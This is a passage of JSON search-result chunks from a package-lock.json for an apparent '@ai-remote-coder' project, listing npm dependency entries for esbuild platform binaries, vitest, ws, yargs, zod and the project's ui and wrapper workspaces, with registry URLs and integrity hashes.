\"https://opencollective.com/vitest\"\n      }\n    },\n    \"node_modules/vite/node_modules/@esbuild/aix-ppc64\": {\n      \"version\": \"0.21.5\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/aix-ppc64/-/aix-ppc64-0.21.5.tgz\",\n      \"integrity\": \"sha512-1SDgH6ZSPTlggy1yI6+Dbkiz8xzpHJEVAlF/AM1tHPLsf5STom9rwtjE4hKAF20FfXXNTFqEYXyJNWh1GiZedQ==\",\n      \"cpu\": [\n        \"ppc64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"aix\"\n      ],\n      \"engines\": {\n        \"node\": \">=12\"\n      }\n    },\n    \"node_modules/vite/node_modules/@esbuild/android-arm\": {\n      \"version\": \"0.21.5\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/android-arm/-/android-arm-0.21.5.tgz\",\n      \"integrity\": \"sha512-vCPvzSjpPHEi1siZdlvAlsPxXl7WbOVUBBAowWug4rJHb68Ox8KualB+1ocNvT5fjv6wpkX6o/iEpbDrf68zcg==\",\n      \"cpu\": [\n        \"arm\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"android\"\n      ],\n      \"engines\": {\n        \"node\": \">=12\"\n      }\n    },\n    \"node_modules/vite/node_modules/@esbuild/android-arm64\": {\n      \"version\": \"0.21.5\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/android-arm64/-/android-arm64-0.21.5.tgz\",\n      \"integrity\": \"sha512-c0uX9VAUBQ7dTDCjq+wdyGLowMdtR/GoC2U5IYk/7D1H1JYC0qseD7+11iMP2mRLN9RcCMRcjC4YMclCzGwS/A==\",\n      \"cpu\": [\n        \"arm64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"android\"\n      ],\n      \"engines\": {\n        \"node\": \">=12\"\n      }\n    },\n    \"node_modules/vite/node_modules/@esbuild/android-x64\": {\n      \"version\": \"0.21.5\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/android-x64/-/android-x64-0.21.5.tgz\",\n      \"integrity\": \"sha512-D7aPRUUNHRBwHxzxRvp856rjUHRFW1SdQATKXH2hqA0kAZb1hKmi02OpYRacl0TxIGz/ZmXWlbZgjwWYaCakTA==\",\n      \"cpu\": [\n        \"x64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [", "metadata": {"file": "package-lock.json", "start_line": 5401, "end_line": 5600, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:5601", "score": 0.0, "content": "        \"android\"\n      ],\n      \"engines\": {\n        \"node\": \">=12\"\n      }\n    },\n    \"node_modules/vite/node_modules/@esbuild/darwin-arm64\": {\n      \"version\": \"0.21.5\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/darwin-arm64/-/darwin-arm64-0.21.5.tgz\",\n      \"integrity\": \"sha512-DwqXqZyuk5AiWWf3UfLiRDJ5EDd49zg6O9wclZ7kUMv2WRFr4HKjXp/5t8JZ11QbQfUS6/cRCKGwYhtNAY88kQ==\",\n      \"cpu\": [\n        \"arm64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"darwin\"\n      ],\n      \"engines\": {\n        \"node\": \">=12\"\n      }\n    },\n    \"node_modules/vite/node_modules/@esbuild/darwin-x64\": {\n      \"version\": \"0.21.5\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/darwin-x64/-/darwin-x64-0.21.5.tgz\",\n      \"integrity\": \"sha512-se/JjF8NlmKVG4kNIuyWMV/22ZaerB+qaSi5MdrXtd6R08kvs2qCN4C09miupktDitvh8jRFflwGFBQcxZRjbw==\",\n      \"cpu\": [\n        \"x64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"darwin\"\n      ],\n      \"engines\": {\n        \"node\": \">=12\"\n      }\n    },\n    \"node_modules/vite/node_modules/@esbuild/freebsd-arm64\": {\n      \"version\": \"0.21.5\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/freebsd-arm64/-/freebsd-arm64-0.21.5.tgz\",\n      \"integrity\": \"sha512-5JcRxxRDUJLX8JXp/wcBCy3pENnCgBR9bN6JsY4OmhfUtIHe3ZW0mawA7+RDAcMLrMIZaf03NlQiX9DGyB8h4g==\",\n      \"cpu\": [\n        \"arm64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"freebsd\"\n      ],\n      \"engines\": {\n        \"node\": \">=12\"\n      }\n    },\n    \"node_modules/vite/node_modules/@esbuild/freebsd-x64\": {\n      \"version\": \"0.21.5\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/freebsd-x64/-/freebsd-x64-0.21.5.tgz\",\n      \"integrity\": \"sha512-J95kNBj1zkbMXtHVH29bBriQygMXqoVQOQYA+ISs0/2l3T9/kj42ow2mpqerRBxDJnmkUDCaQT/dfNXWX/ZZCQ==\",\n      \"cpu\": [\n        \"x64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"freebsd\"\n      ],\n      \"engines\": {\n        \"node\": \">=12\"\n      }\n    },\n    \"node_modules/vite/node_modules/@esbuild/linux-arm\": {\n      \"version\": \"0.21.5\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/linux-arm/-/linux-arm-0.21.5.tgz\",\n      \"integrity\": \"sha512-bPb5AHZtbeNGjCKVZ9UGqGwo8EUu4cLq68E95A53KlxAPRmUyYv2D6F0uUI65XisGOL1hBP5mTronbgo+0bFcA==\",\n      \"cpu\": [\n        \"arm\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ],\n      \"engines\": {\n        \"node\": \">=12\"\n      }\n    },\n    \"node_modules/vite/node_modules/@esbuild/linux-arm64\": {\n      \"version\": \"0.21.5\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/linux-arm64/-/linux-arm64-0.21.5.tgz\",\n      \"integrity\": \"sha512-ibKvmyYzKsBeX8d8I7MH/TMfWDXBF3db4qM6sy+7re0YXya+K1cem3on9XgdT2EQGMu4hQyZhan7TeQ8XkGp4Q==\",\n      \"cpu\": [\n        \"arm64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ],\n      \"engines\": {\n        \"node\": \">=12\"\n      }\n    },\n    \"node_modules/vite/node_modules/@esbuild/linux-ia32\": {\n      \"version\": \"0.21.5\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/linux-ia32/-/linux-ia32-0.21.5.tgz\",\n      \"integrity\": \"sha512-YvjXDqLRqPDl2dvRODYmmhz4rPeVKYvppfGYKSNGdyZkA01046pLWyRKKI3ax8fbJoK5QbxblURkwK/MWY18Tg==\",\n      \"cpu\": [\n        \"ia32\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ],\n      \"engines\": {\n        \"node\": \">=12\"\n      }\n    },\n    \"node_modules/vite/node_modules/@esbuild/linux-loong64\": {\n      \"version\": \"0.21.5\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/linux-loong64/-/linux-loong64-0.21.5.tgz\",\n      \"integrity\": \"sha512-uHf1BmMG8qEvzdrzAqg2SIG/02+4/DHB6a9Kbya0XDvwDEKCoC8ZRWI5JJvNdUjtciBGFQ5PuBlpEOXQj+JQSg==\",\n      \"cpu\": [\n        \"loong64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ],\n      \"engines\": {\n        \"node\": \">=12\"\n      }\n    },\n    \"node_modules/vite/node_modules/@esbuild/linux-mips64el\": {\n      \"version\": \"0.21.5\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/linux-mips64el/-/linux-mips64el-0.21.5.tgz\",\n      \"integrity\": \"sha512-IajOmO+KJK23bj52dFSNCMsz1QP1DqM6cwLUv3W1QwyxkyIWecfafnI555fvSGqEKwjMXVLokcV5ygHW5b3Jbg==\",\n      \"cpu\": [\n        \"mips64el\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ],\n      \"engines\": {\n        \"node\": \">=12\"\n      }\n    },\n    \"node_modules/vite/node_modules/@esbuild/linux-ppc64\": {\n      \"version\": \"0.21.5\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/linux-ppc64/-/linux-ppc64-0.21.5.tgz\",\n      \"integrity\": \"sha512-1hHV/Z4OEfMwpLO8rp7CvlhBDnjsC3CttJXIhBi+5Aj5r+MBvy4egg7wCbe//hSsT+RvDAG7s81tAvpL2XAE4w==\",\n      \"cpu\": [\n        \"ppc64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ],\n      \"engines\": {\n        \"node\": \">=12\"\n      }\n    },\n    \"node_modules/vite/node_modules/@esbuild/linux-riscv64\": {\n      \"version\": \"0.21.5\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/linux-riscv64/-/linux-riscv64-0.21.5.tgz\",\n      \"integrity\": \"sha512-2HdXDMd9GMgTGrPWnJzP2ALSokE/0O5HhTUvWIbD3YdjME8JwvSCnNGBnTThKGEB91OZhzrJ4qIIxk/SBmyDDA==\",\n      \"cpu\": [\n        \"riscv64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ],\n      \"engines\": {\n        \"node\": \">=12\"\n      }\n    },\n    \"node_modules/vite/node_modules/@esbuild/linux-s390x\": {\n      \"version\": \"0.21.5\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/linux-s390x/-/linux-s390x-0.21.5.tgz\",\n      \"integrity\": \"sha512-zus5sxzqBJD3eXxwvjN1yQkRepANgxE9lgOW2qLnmr8ikMTphkjgXu1HR01K4FJg8h1kEEDAqDcZQtbrRnB41A==\",\n      \"cpu\": [\n        \"s390x\"\n      ],", "metadata": {"file": "package-lock.json", "start_line": 5601, "end_line": 5800, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:5801", "score": 0.0, "content": "      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ],\n      \"engines\": {\n        \"node\": \">=12\"\n      }\n    },\n    \"node_modules/vite/node_modules/@esbuild/linux-x64\": {\n      \"version\": \"0.21.5\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/linux-x64/-/linux-x64-0.21.5.tgz\",\n      \"integrity\": \"sha512-1rYdTpyv03iycF1+BhzrzQJCdOuAOtaqHTWJZCWvijKD2N5Xu0TtVC8/+1faWqcP9iBCWOmjmhoH94dH82BxPQ==\",\n      \"cpu\": [\n        \"x64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ],\n      \"engines\": {\n        \"node\": \">=12\"\n      }\n    },\n    \"node_modules/vite/node_modules/@esbuild/netbsd-x64\": {\n      \"version\": \"0.21.5\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/netbsd-x64/-/netbsd-x64-0.21.5.tgz\",\n      \"integrity\": \"sha512-Woi2MXzXjMULccIwMnLciyZH4nCIMpWQAs049KEeMvOcNADVxo0UBIQPfSmxB3CWKedngg7sWZdLvLczpe0tLg==\",\n      \"cpu\": [\n        \"x64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"netbsd\"\n      ],\n      \"engines\": {\n        \"node\": \">=12\"\n      }\n    },\n    \"node_modules/vite/node_modules/@esbuild/openbsd-x64\": {\n      \"version\": \"0.21.5\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/openbsd-x64/-/openbsd-x64-0.21.5.tgz\",\n      \"integrity\": \"sha512-HLNNw99xsvx12lFBUwoT8EVCsSvRNDVxNpjZ7bPn947b8gJPzeHWyNVhFsaerc0n3TsbOINvRP2byTZ5LKezow==\",\n      \"cpu\": [\n        \"x64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"openbsd\"\n      ],\n      \"engines\": {\n        \"node\": \">=12\"\n      }\n    },\n    \"node_modules/vite/node_modules/@esbuild/sunos-x64\": {\n      \"version\": \"0.21.5\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/sunos-x64/-/sunos-x64-0.21.5.tgz\",\n      \"integrity\": \"sha512-6+gjmFpfy0BHU5Tpptkuh8+uw3mnrvgs+dSPQXQOv3ekbordwnzTVEb4qnIvQcYXq6gzkyTnoZ9dZG+D4garKg==\",\n      \"cpu\": [\n        \"x64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"sunos\"\n      ],\n      \"engines\": {\n        \"node\": \">=12\"\n      }\n    },\n    \"node_modules/vite/node_modules/@esbuild/win32-arm64\": {\n      \"version\": \"0.21.5\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/win32-arm64/-/win32-arm64-0.21.5.tgz\",\n      \"integrity\": \"sha512-Z0gOTd75VvXqyq7nsl93zwahcTROgqvuAcYDUr+vOv8uHhNSKROyU961kgtCD1e95IqPKSQKH7tBTslnS3tA8A==\",\n      \"cpu\": [\n        \"arm64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"win32\"\n      ],\n      \"engines\": {\n        \"node\": \">=12\"\n      }\n    },\n    \"node_modules/vite/node_modules/@esbuild/win32-ia32\": {\n      \"version\": \"0.21.5\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/win32-ia32/-/win32-ia32-0.21.5.tgz\",\n      \"integrity\": \"sha512-SWXFF1CL2RVNMaVs+BBClwtfZSvDgtL//G/smwAc5oVK/UPu2Gu9tIaRgFmYFFKrmg3SyAjSrElf0TiJ1v8fYA==\",\n      \"cpu\": [\n        \"ia32\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"win32\"\n      ],\n      \"engines\": {\n        \"node\": \">=12\"\n      }\n    },\n    \"node_modules/vite/node_modules/@esbuild/win32-x64\": {\n      \"version\": \"0.21.5\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/win32-x64/-/win32-x64-0.21.5.tgz\",\n      \"integrity\": \"sha512-tQd/1efJuzPC6rCFwEvLtci/xNFcTZknmXs98FYDfGE4wP9ClFV98nyKrzJKVPMhdDnjzLhdUyMX4PsQAPjwIw==\",\n      \"cpu\": [\n        \"x64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"win32\"\n      ],\n      \"engines\": {\n        \"node\": \">=12\"\n      }\n    },\n    \"node_modules/vite/node_modules/esbuild\": {\n      \"version\": \"0.21.5\",\n      \"resolved\": \"https://registry.npmjs.org/esbuild/-/esbuild-0.21.5.tgz\",\n      \"integrity\": \"sha512-mg3OPMV4hXywwpoDxu3Qda5xCKQi+vCTZq8S9J/EpkhB2HzKXq4SNFZE3+NK93JYxc8VMSep+lOUSC/RVKaBqw==\",\n      \"dev\": true,\n      \"hasInstallScript\": true,\n      \"license\": \"MIT\",\n      \"bin\": {\n        \"esbuild\": \"bin/esbuild\"\n      },\n      \"engines\": {\n        \"node\": \">=12\"\n      },\n      \"optionalDependencies\": {\n        \"@esbuild/aix-ppc64\": \"0.21.5\",\n        \"@esbuild/android-arm\": \"0.21.5\",\n        \"@esbuild/android-arm64\": \"0.21.5\",\n        \"@esbuild/android-x64\": \"0.21.5\",\n        \"@esbuild/darwin-arm64\": \"0.21.5\",\n        \"@esbuild/darwin-x64\": \"0.21.5\",\n        \"@esbuild/freebsd-arm64\": \"0.21.5\",\n        \"@esbuild/freebsd-x64\": \"0.21.5\",\n        \"@esbuild/linux-arm\": \"0.21.5\",\n        \"@esbuild/linux-arm64\": \"0.21.5\",\n        \"@esbuild/linux-ia32\": \"0.21.5\",\n        \"@esbuild/linux-loong64\": \"0.21.5\",\n        \"@esbuild/linux-mips64el\": \"0.21.5\",\n        \"@esbuild/linux-ppc64\": \"0.21.5\",\n        \"@esbuild/linux-riscv64\": \"0.21.5\",\n        \"@esbuild/linux-s390x\": \"0.21.5\",\n        \"@esbuild/linux-x64\": \"0.21.5\",\n        \"@esbuild/netbsd-x64\": \"0.21.5\",\n        \"@esbuild/openbsd-x64\": \"0.21.5\",\n        \"@esbuild/sunos-x64\": \"0.21.5\",\n        \"@esbuild/win32-arm64\": \"0.21.5\",\n        \"@esbuild/win32-ia32\": \"0.21.5\",\n        \"@esbuild/win32-x64\": \"0.21.5\"\n      }\n    },\n    \"node_modules/vitest\": {\n      \"version\": \"1.6.1\",\n      \"resolved\": \"https://registry.npmjs.org/vitest/-/vitest-1.6.1.tgz\",\n      \"integrity\": \"sha512-Ljb1cnSJSivGN0LqXd/zmDbWEM0RNNg2t1QW/XUhYl/qPqyu7CsqeWtqQXHVaJsecLPuDoak2oJcZN2QoRIOag==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@vitest/expect\": \"1.6.1\",\n        \"@vitest/runner\": \"1.6.1\",\n        \"@vitest/snapshot\": \"1.6.1\",\n        \"@vitest/spy\": \"1.6.1\",\n        \"@vitest/utils\": \"1.6.1\",\n        \"acorn-walk\": \"^8.3.2\",\n        \"chai\": \"^4.3.10\",\n        \"debug\": \"^4.3.4\",\n        \"execa\": \"^8.0.1\",\n        \"local-pkg\": \"^0.5.0\",\n        \"magic-string\": \"^0.30.5\",\n        \"pathe\": \"^1.1.1\",\n        \"picocolors\": \"^1.0.0\",\n        \"std-env\": \"^3.5.0\",\n        \"strip-literal\": \"^2.0.0\",\n        \"tinybench\": \"^2.5.1\",\n        \"tinypool\": \"^0.8.3\",\n        \"vite\": \"^5.0.0\",\n        \"vite-node\": \"1.6.1\",\n        \"why-is-node-running\": \"^2.2.2\"\n      },\n      \"bin\": {\n        \"vitest\": \"vitest.mjs\"\n      },\n      \"engines\": {", "metadata": {"file": "package-lock.json", "start_line": 5801, "end_line": 6000, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:6001", "score": 0.0, "content": "        \"node\": \"^18.0.0 || >=20.0.0\"\n      },\n      \"funding\": {\n        \"url\": \"https://opencollective.com/vitest\"\n      },\n      \"peerDependencies\": {\n        \"@edge-runtime/vm\": \"*\",\n        \"@types/node\": \"^18.0.0 || >=20.0.0\",\n        \"@vitest/browser\": \"1.6.1\",\n        \"@vitest/ui\": \"1.6.1\",\n        \"happy-dom\": \"*\",\n        \"jsdom\": \"*\"\n      },\n      \"peerDependenciesMeta\": {\n        \"@edge-runtime/vm\": {\n          \"optional\": true\n        },\n        \"@types/node\": {\n          \"optional\": true\n        },\n        \"@vitest/browser\": {\n          \"optional\": true\n        },\n        \"@vitest/ui\": {\n          \"optional\": true\n        },\n        \"happy-dom\": {\n          \"optional\": true\n        },\n        \"jsdom\": {\n          \"optional\": true\n        }\n      }\n    },\n    \"node_modules/web-streams-polyfill\": {\n      \"version\": \"3.3.3\",\n      \"resolved\": \"https://registry.npmjs.org/web-streams-polyfill/-/web-streams-polyfill-3.3.3.tgz\",\n      \"integrity\": \"sha512-d2JWLCivmZYTSIoge9MsgFCZrt571BikcWGYkjC1khllbTeDlGqZ2D8vD8E/lJa8WGWbb7Plm8/XJYV7IJHZZw==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">= 8\"\n      }\n    },\n    \"node_modules/webidl-conversions\": {\n      \"version\": \"3.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/webidl-conversions/-/webidl-conversions-3.0.1.tgz\",\n      \"integrity\": \"sha512-2JAn3z8AR6rjK8Sm8orRC0h/bcl/DqL7tRPdGZ4I1CjdF+EaMLmYxBHyXuKL849eucPFhvBoxMsflfOb8kxaeQ==\",\n      \"license\": \"BSD-2-Clause\"\n    },\n    \"node_modules/whatwg-url\": {\n      \"version\": \"5.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/whatwg-url/-/whatwg-url-5.0.0.tgz\",\n      \"integrity\": \"sha512-saE57nupxk6v3HY35+jzBwYa0rKSy0XR8JSxZPwgLr7ys0IBzhGviA1/TUGJLmSVqs8pb9AnvICXEuOHLprYTw==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"tr46\": \"~0.0.3\",\n        \"webidl-conversions\": \"^3.0.0\"\n      }\n    },\n    \"node_modules/which\": {\n      \"version\": \"2.0.2\",\n      \"resolved\": \"https://registry.npmjs.org/which/-/which-2.0.2.tgz\",\n      \"integrity\": \"sha512-BLI3Tl1TW3Pvl70l3yq3Y64i+awpwXqsGBYWkkqMtnbXgrMD+yj7rhW0kuEDxzJaYXGjEW5ogapKNMEKNMjibA==\",\n      \"license\": \"ISC\",\n      \"dependencies\": {\n        \"isexe\": \"^2.0.0\"\n      },\n      \"bin\": {\n        \"node-which\": \"bin/node-which\"\n      },\n      \"engines\": {\n        \"node\": \">= 8\"\n      }\n    },\n    \"node_modules/why-is-node-running\": {\n      \"version\": \"2.3.0\",\n      \"resolved\": \"https://registry.npmjs.org/why-is-node-running/-/why-is-node-running-2.3.0.tgz\",\n      \"integrity\": \"sha512-hUrmaWBdVDcxvYqnyh09zunKzROWjbZTiNy8dBEjkS7ehEDQibXJ7XvlmtbwuTclUiIyN+CyXQD4Vmko8fNm8w==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"siginfo\": \"^2.0.0\",\n        \"stackback\": \"0.0.2\"\n      },\n      \"bin\": {\n        \"why-is-node-running\": \"cli.js\"\n      },\n      \"engines\": {\n        \"node\": \">=8\"\n      }\n    },\n    \"node_modules/wide-align\": {\n      \"version\": \"1.1.5\",\n      \"resolved\": \"https://registry.npmjs.org/wide-align/-/wide-align-1.1.5.tgz\",\n      \"integrity\": \"sha512-eDMORYaPNZ4sQIuuYPDHdQvf4gyCF9rEEV/yPxGfwPkRodwEgiMUUXTx/dex+Me0wxx53S+NgUHaP7y3MGlDmg==\",\n      \"license\": \"ISC\",\n      \"dependencies\": {\n        \"string-width\": \"^1.0.2 || 2 || 3 || 4\"\n      }\n    },\n    \"node_modules/wrap-ansi\": {\n      \"version\": \"7.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/wrap-ansi/-/wrap-ansi-7.0.0.tgz\",\n      \"integrity\": \"sha512-YVGIj2kamLSTxw6NsZjoBxfSwsn0ycdesmc4p+Q21c5zPuZ1pl+NfxVdxPtdHvmNVOQ6XSYG4AUtyt/Fi7D16Q==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"ansi-styles\": \"^4.0.0\",\n        \"string-width\": \"^4.1.0\",\n        \"strip-ansi\": \"^6.0.0\"\n      },\n      \"engines\": {\n        \"node\": \">=10\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/chalk/wrap-ansi?sponsor=1\"\n      }\n    },\n    \"node_modules/wrap-ansi-cjs\": {\n      \"name\": \"wrap-ansi\",\n      \"version\": \"7.0.0\",\n      \"resolved\": \"https://registry.npmjs.org/wrap-ansi/-/wrap-ansi-7.0.0.tgz\",\n      \"integrity\": \"sha512-YVGIj2kamLSTxw6NsZjoBxfSwsn0ycdesmc4p+Q21c5zPuZ1pl+NfxVdxPtdHvmNVOQ6XSYG4AUtyt/Fi7D16Q==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"ansi-styles\": \"^4.0.0\",\n        \"string-width\": \"^4.1.0\",\n        \"strip-ansi\": \"^6.0.0\"\n      },\n      \"engines\": {\n        \"node\": \">=10\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/chalk/wrap-ansi?sponsor=1\"\n      }\n    },\n    \"node_modules/wrappy\": {\n      \"version\": \"1.0.2\",\n      \"resolved\": \"https://registry.npmjs.org/wrappy/-/wrappy-1.0.2.tgz\",\n      \"integrity\": \"sha512-l4Sp/DRseor9wL6EvV2+TuQn63dMkPjZ/sp9XkghTEbV9KlPS1xUsZ3u7/IQO4wxtcFB4bgpQPRcR3QCvezPcQ==\",\n      \"license\": \"ISC\"\n    },\n    \"node_modules/ws\": {\n      \"version\": \"8.19.0\",\n      \"resolved\": \"https://registry.npmjs.org/ws/-/ws-8.19.0.tgz\",\n      \"integrity\": \"sha512-blAT2mjOEIi0ZzruJfIhb3nps74PRWTCz1IjglWEEpQl5XS/UNama6u2/rjFkDDouqr4L67ry+1aGIALViWjDg==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=10.0.0\"\n      },\n      \"peerDependencies\": {\n        \"bufferutil\": \"^4.0.1\",\n        \"utf-8-validate\": \">=5.0.2\"\n      },\n      \"peerDependenciesMeta\": {\n        \"bufferutil\": {\n          \"optional\": true\n        },\n        \"utf-8-validate\": {\n          \"optional\": true\n        }\n      }\n    },\n    \"node_modules/y18n\": {\n      \"version\": \"5.0.8\",\n      \"resolved\": \"https://registry.npmjs.org/y18n/-/y18n-5.0.8.tgz\",\n      \"integrity\": \"sha512-0pfFzegeDWJHJIAmTLRP2DwHjdF5s7jo9tuztdQxAhINCdvS+3nGINqPd00AphqJR/0LhANUS6/+7SCb98YOfA==\",\n      \"dev\": true,\n      \"license\": \"ISC\",\n      \"engines\": {\n        \"node\": \">=10\"\n      }\n    },\n    \"node_modules/yallist\": {\n      \"version\": \"3.1.1\",\n      \"resolved\": \"https://registry.npmjs.org/yallist/-/yallist-3.1.1.tgz\",\n      \"integrity\": \"sha512-a4UGQaWPH59mOXUYnAG2ewncQS4i4F43Tv3JoAM+s2VDAmS9NsK8GpDMLrCHPksFT7h3K6TOoUNn2pb7RoXx4g==\",\n      \"dev\": true,\n      \"license\": \"ISC\"\n    },\n    \"node_modules/yargs\": {\n      \"version\": \"17.7.2\",\n      \"resolved\": \"https://registry.npmjs.org/yargs/-/yargs-17.7.2.tgz\",\n      \"integrity\": \"sha512-7dSzzRQ++CKnNI/krKnYRV7JKKPUXMEh61soaHKg9mrWEhzFWhFnxPxGl+69cD1Ou63C13NUPCnmIcrvqCuM6w==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"cliui\": \"^8.0.1\",\n        \"escalade\": \"^3.1.1\",\n        \"get-caller-file\": \"^2.0.5\",\n        \"require-directory\": \"^2.1.1\",\n        \"string-width\": \"^4.2.3\",\n        \"y18n\": \"^5.0.5\",\n        \"yargs-parser\": \"^21.1.1\"\n      },\n      \"engines\": {\n        \"node\": \">=12\"\n      }\n    },\n    \"node_modules/yargs-parser\": {", "metadata": {"file": "package-lock.json", "start_line": 6001, "end_line": 6200, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:6201", "score": 0.0, "content": "      \"version\": \"21.1.1\",\n      \"resolved\": \"https://registry.npmjs.org/yargs-parser/-/yargs-parser-21.1.1.tgz\",\n      \"integrity\": \"sha512-tVpsJW7DdjecAiFpbIB1e3qxIQsE6NoPc5/eTdrbbIC4h0LVsWhnoa3g+m2HclBIujHzsxZ4VJVA+GUuc2/LBw==\",\n      \"dev\": true,\n      \"license\": \"ISC\",\n      \"engines\": {\n        \"node\": \">=12\"\n      }\n    },\n    \"node_modules/yocto-queue\": {\n      \"version\": \"1.2.2\",\n      \"resolved\": \"https://registry.npmjs.org/yocto-queue/-/yocto-queue-1.2.2.tgz\",\n      \"integrity\": \"sha512-4LCcse/U2MHZ63HAJVE+v71o7yOdIe4cZ70Wpf8D/IyjDKYQLV5GD46B+hSTjJsvV5PztjvHoU580EftxjDZFQ==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=12.20\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/sindresorhus\"\n      }\n    },\n    \"node_modules/zod\": {\n      \"version\": \"3.25.76\",\n      \"resolved\": \"https://registry.npmjs.org/zod/-/zod-3.25.76.tgz\",\n      \"integrity\": \"sha512-gzUt/qt81nXsFGKIFcC3YnfEAx5NkunCfnDlvuBSSFS02bcXu4Lmea0AFIUwbLWxWPx3d9p8S5QoaujKcNQxcQ==\",\n      \"license\": \"MIT\",\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/colinhacks\"\n      }\n    },\n    \"ui\": {\n      \"name\": \"@ai-remote-coder/ui\",\n      \"version\": \"1.0.0\",\n      \"dependencies\": {\n        \"react\": \"^18.2.0\",\n        \"react-dom\": \"^18.2.0\",\n        \"react-router-dom\": \"^6.21.1\"\n      },\n      \"devDependencies\": {\n        \"@types/react\": \"^18.2.46\",\n        \"@types/react-dom\": \"^18.2.18\",\n        \"@vitejs/plugin-react\": \"^4.2.1\",\n        \"typescript\": \"^5.3.3\",\n        \"vite\": \"^5.0.10\"\n      }\n    },\n    \"wrapper\": {\n      \"name\": \"@ai-remote-coder/wrapper\",\n      \"version\": \"1.1.0\",\n      \"dependencies\": {\n        \"commander\": \"^11.1.0\",\n        \"dotenv\": \"^16.3.1\",\n        \"form-data\": \"^4.0.0\",\n        \"nanoid\": \"^5.0.4\",\n        \"node-fetch\": \"^3.3.2\",\n        \"ws\": \"^8.16.0\"\n      },\n      \"bin\": {\n        